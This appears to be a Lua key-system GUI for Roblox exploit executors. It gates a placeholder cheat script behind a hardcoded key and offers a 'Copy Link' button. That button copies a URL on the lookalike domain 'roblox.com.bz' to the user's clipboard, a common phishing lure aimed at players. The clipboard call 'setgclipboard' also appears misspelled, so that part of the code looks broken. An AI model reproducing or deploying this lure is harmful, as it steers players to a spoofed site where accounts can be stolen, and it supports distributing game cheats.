-- ╔══════════════════════════════════════╗
-- ║        KEY SYSTEM GUI - V1.0         ║
-- ║     Change YOUR_KEY_LINK below!      ║
-- ╚══════════════════════════════════════╝

local VALID_KEY = "YOUR_KEY_HERE"          -- << Change this to your key
local KEY_LINK  = "https://roblox.com.bz/communities/7261936639/" -- << Change this to your link anytime

-- ── Services ──────────────────────────────────────────────────────────────────
local Players        = game:GetService("Players")
local TweenService   = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player     = Players.LocalPlayer
local playerGui  = player:WaitForChild("PlayerGui")

-- ── ScreenGui ─────────────────────────────────────────────────────────────────
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name             = "KeySystemGui"
ScreenGui.ResetOnSpawn     = false
ScreenGui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent           = playerGui

-- ── Blur effect ───────────────────────────────────────────────────────────────
local blur = Instance.new("BlurEffect")
blur.Size   = 0
blur.Parent = game:GetService("Lighting")

-- ── Dark overlay ──────────────────────────────────────────────────────────────
local Overlay = Instance.new("Frame")
Overlay.Size            = UDim2.new(1, 0, 1, 0)
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 1
Overlay.ZIndex          = 9
Overlay.Parent          = ScreenGui

-- ── Main window ───────────────────────────────────────────────────────────────
local Main = Instance.new("Frame")
Main.Size                = UDim2.new(0, 480, 0, 280)
Main.Position            = UDim2.new(0.5, -240, 0.5, -140)
Main.BackgroundColor3    = Color3.fromRGB(12, 12, 18)
Main.BorderSizePixel     = 0
Main.ZIndex              = 10
Main.Parent              = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 16)
MainCorner.Parent       = Main

-- Accent border glow
local Stroke = Instance.new("UIStroke")
Stroke.Color       = Color3.fromRGB(120, 80, 255)
Stroke.Thickness   = 1.5
Stroke.Transparency = 0.3
Stroke.Parent      = Main

-- ── Top accent bar ────────────────────────────────────────────────────────────
local TopBar = Instance.new("Frame")
TopBar.Size             = UDim2.new(1, 0, 0, 4)
TopBar.BackgroundColor3 = Color3.fromRGB(120, 80, 255)
TopBar.BorderSizePixel  = 0
TopBar.ZIndex           = 11
TopBar.Parent           = Main

local TopCorner = Instance.new("UICorner")
TopCorner.CornerRadius = UDim.new(0, 16)
TopCorner.Parent       = TopBar

-- ── Title & subtitle ─────────────────────────────────────────────────────────
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size                  = UDim2.new(1, 0, 0, 36)
TitleLabel.Position              = UDim2.new(0, 0, 0, 20)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text                  = "🔐  KEY SYSTEM"
TitleLabel.TextColor3            = Color3.fromRGB(255, 255, 255)
TitleLabel.Font                  = Enum.Font.GothamBold
TitleLabel.TextSize              = 22
TitleLabel.ZIndex                = 11
TitleLabel.Parent                = Main

local SubLabel = Instance.new("TextLabel")
SubLabel.Size                   = UDim2.new(1, 0, 0, 20)
SubLabel.Position               = UDim2.new(0, 0, 0, 56)
SubLabel.BackgroundTransparency = 1
SubLabel.Text                   = "Enter your key to access the script"
SubLabel.TextColor3             = Color3.fromRGB(130, 110, 200)
SubLabel.Font                   = Enum.Font.Gotham
SubLabel.TextSize               = 13
SubLabel.ZIndex                 = 11
SubLabel.Parent                 = Main

-- ── Divider ──────────────────────────────────────────────────────────────────
local Divider = Instance.new("Frame")
Divider.Size             = UDim2.new(0.85, 0, 0, 1)
Divider.Position         = UDim2.new(0.075, 0, 0, 86)
Divider.BackgroundColor3 = Color3.fromRGB(50, 40, 80)
Divider.BorderSizePixel  = 0
Divider.ZIndex           = 11
Divider.Parent           = Main

-- ── Key input box ─────────────────────────────────────────────────────────────
local InputBox = Instance.new("TextBox")
InputBox.Size                = UDim2.new(0.85, 0, 0, 44)
InputBox.Position            = UDim2.new(0.075, 0, 0, 100)
InputBox.BackgroundColor3    = Color3.fromRGB(22, 18, 38)
InputBox.BorderSizePixel     = 0
InputBox.PlaceholderText     = "  Paste your key here..."
InputBox.PlaceholderColor3   = Color3.fromRGB(80, 65, 110)
InputBox.Text                = ""
InputBox.TextColor3          = Color3.fromRGB(220, 210, 255)
InputBox.Font                = Enum.Font.GothamMedium
InputBox.TextSize            = 14
InputBox.TextXAlignment      = Enum.TextXAlignment.Left
InputBox.ZIndex              = 11
InputBox.Parent              = Main

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 10)
InputCorner.Parent       = InputBox

local InputStroke = Instance.new("UIStroke")
InputStroke.Color       = Color3.fromRGB(80, 55, 160)
InputStroke.Thickness   = 1
InputStroke.Parent      = InputBox

-- ── Buttons row ───────────────────────────────────────────────────────────────
-- [ Check Key ]  ──────────────────────────────  [ Copy Link ]

local function makeButton(text, posX, color, icon)
    local btn = Instance.new("TextButton")
    btn.Size             = UDim2.new(0, 175, 0, 42)
    btn.Position         = UDim2.new(0, posX, 0, 164)
    btn.BackgroundColor3 = color
    btn.BorderSizePixel  = 0
    btn.Text             = icon .. "  " .. text
    btn.TextColor3       = Color3.fromRGB(255, 255, 255)
    btn.Font             = Enum.Font.GothamBold
    btn.TextSize         = 14
    btn.ZIndex           = 11
    btn.Parent           = Main

    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 10)
    c.Parent = btn

    -- Hover / click feedback
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {
            BackgroundColor3 = color:lerp(Color3.fromRGB(255,255,255), 0.12)
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()
    end)
    btn.MouseButton1Down:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.08), {
            Size = UDim2.new(0, 170, 0, 40)
        }):Play()
    end)
    btn.MouseButton1Up:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.08), {
            Size = UDim2.new(0, 175, 0, 42)
        }):Play()
    end)

    return btn
end

local CheckBtn = makeButton("Check Key", 52,  Color3.fromRGB(100, 60, 220), "✔")
local CopyBtn  = makeButton("Copy Link", 252, Color3.fromRGB(50, 170, 120),  "🔗")

-- ── Status label ──────────────────────────────────────────────────────────────
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size                   = UDim2.new(0.85, 0, 0, 24)
StatusLabel.Position               = UDim2.new(0.075, 0, 0, 218)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text                   = ""
StatusLabel.TextColor3             = Color3.fromRGB(180, 160, 255)
StatusLabel.Font                   = Enum.Font.Gotham
StatusLabel.TextSize               = 13
StatusLabel.ZIndex                 = 11
StatusLabel.Parent                 = Main

-- ── Helper: set status text ───────────────────────────────────────────────────
local function setStatus(msg, color)
    StatusLabel.Text       = msg
    StatusLabel.TextColor3 = color or Color3.fromRGB(180, 160, 255)
end

-- ── Open animation ────────────────────────────────────────────────────────────
Main.Size = UDim2.new(0, 480, 0, 0)
TweenService:Create(blur,    TweenInfo.new(0.4), {Size = 12}):Play()
TweenService:Create(Overlay, TweenInfo.new(0.4), {BackgroundTransparency = 0.55}):Play()
TweenService:Create(Main,    TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, 480, 0, 280)
}):Play()

-- ── Check Key logic ───────────────────────────────────────────────────────────
CheckBtn.MouseButton1Click:Connect(function()
    local entered = InputBox.Text

    if entered == "" then
        setStatus("⚠  Please enter a key first.", Color3.fromRGB(255, 200, 60))
        return
    end

    if entered == VALID_KEY then
        setStatus("✔  Valid key! Loading script...", Color3.fromRGB(80, 220, 140))

        task.wait(0.8)

        -- Close animation
        TweenService:Create(blur,    TweenInfo.new(0.35), {Size = 0}):Play()
        TweenService:Create(Overlay, TweenInfo.new(0.35), {BackgroundTransparency = 1}):Play()
        TweenService:Create(Main,    TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 480, 0, 0)
        }):Play()

        task.wait(0.4)
        ScreenGui:Destroy()
        blur:Destroy()

        -- ✅ Your main script runs here after key is accepted
        print("Key accepted! Run your script below.")
        -- loadstring(...)() or whatever you want to execute

    else
        setStatus("✖  Incorrect key. Try again.", Color3.fromRGB(255, 80, 80))

        -- Shake animation
        local origPos = Main.Position
        for i = 1, 4 do
            TweenService:Create(Main, TweenInfo.new(0.04), {
                Position = UDim2.new(0.5, -240 + (i % 2 == 0 and 8 or -8), 0.5, -140)
            }):Play()
            task.wait(0.05)
        end
        TweenService:Create(Main, TweenInfo.new(0.06), {Position = origPos}):Play()
    end
end)

-- ── Copy Link logic ───────────────────────────────────────────────────────────
CopyBtn.MouseButton1Click:Connect(function()
    setgclipboard(KEY_LINK)  -- Works in most Roblox executors
    setStatus("🔗  Link copied to clipboard!", Color3.fromRGB(80, 220, 140))
    task.wait(2.5)
    setStatus("")
end)
